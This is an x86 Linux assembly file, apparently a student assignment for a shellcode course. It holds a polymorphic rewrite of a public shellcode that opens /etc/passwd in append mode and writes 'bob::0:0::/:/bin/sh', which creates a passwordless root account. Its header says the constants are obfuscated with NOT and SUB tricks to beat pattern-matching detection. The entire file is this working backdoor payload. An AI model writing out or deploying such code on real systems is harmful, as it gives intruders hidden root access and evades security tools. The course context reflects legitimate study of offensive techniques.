; SLAE - Assignment #6: Polymorphic shell code of http://shell-storm.org/shellcode/files/shellcode-548.php 
; Author:  Dipsy 
; Student ID: SLAE-1535
; Purpose: The purpose of this shellcode is to beat pattern matching 

global _start

section .text

_start:     
	sub eax,eax          ; preparing registers 
	sub ebx,ebx
	sub ecx,ecx

	push ecx             ; null terminator 
	mov eax, 0x9b888c8c  ; push the path name 
	not eax
	push eax

	mov eax, 0x6170E013
	sub ax, 0xb0b0
	push eax
	
	mov eax, 0x7465DFDF
	sub ax, 0xb0b0
	push eax 

	mov ebx,esp         ;//etc/passwd
	mov cx,0xF0C        ; flags 0x401 
	sub cx, 0xb0b 
	
	sub eax, eax 
	or al,0x5           ; open syscall 
	int 0x80

	mov ebx,eax         ; file descriptor 
	sub eax,eax
	sub edx,edx

	mov eax, 0x978cd091  ; buf 
	not eax
	push eax

	mov eax, 0x969dd0d0
	not eax
	push eax

	mov eax, 0xc5d0c5c5
	not eax
	push eax

	mov eax, 0xcfc5cfc5
	not eax
	push eax

	mov eax, 0xc59d909d
	not eax
	push eax

	sub edx, edx
	sub eax, eax

	mov ecx,esp  	   ; hs/nib//:/::0:0::bob string
	or dl,0x14
	or al,0x4          ; write syscall 
	int 0x80
	
	sub eax, eax 
	or al,0x6          ; close syscall 
	int 0x80
	
	sub eax,eax
	or al,0x1          ; exit syscall 
	int 0x80
